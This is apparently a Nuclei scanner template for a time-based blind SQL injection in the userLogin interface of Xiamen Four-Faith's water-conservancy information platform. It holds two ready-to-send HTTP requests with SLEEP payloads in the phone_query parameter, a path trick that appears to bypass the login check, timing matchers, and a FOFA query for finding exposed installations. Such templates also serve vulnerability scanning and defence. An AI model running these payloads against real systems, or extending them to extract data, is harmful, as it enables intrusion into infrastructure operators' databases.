id: fourfaith-water-platform-userlogin-sqli
info:
  name: "厦门四信通信科技水利信息化平台userLogin接口SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    该平台userLogin接口存在SQL注入漏洞，攻击者可通过构造恶意输入获取数据库敏感信息。
    fofa: title="水利信息化平台V2.2登录页面"
  tags: 厦门四信通信科技水利信息化平台
http:
- raw:
  - |
    GET /stAlarmSmsSendLog/index.do;userLogin.do;?phone_query=%27%20AND%20(SELECT%209908%20FROM%20(SELECT(SLEEP(5)))Ikoi)--%20Bbtb HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  - |
    GET /stAlarmSmsSendLog/index.do;userLogin.do;?phone_query=%27%20AND%20(SELECT%209908%20FROM%20(SELECT(SLEEP(8)))Ikoi)--%20Bbtb HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
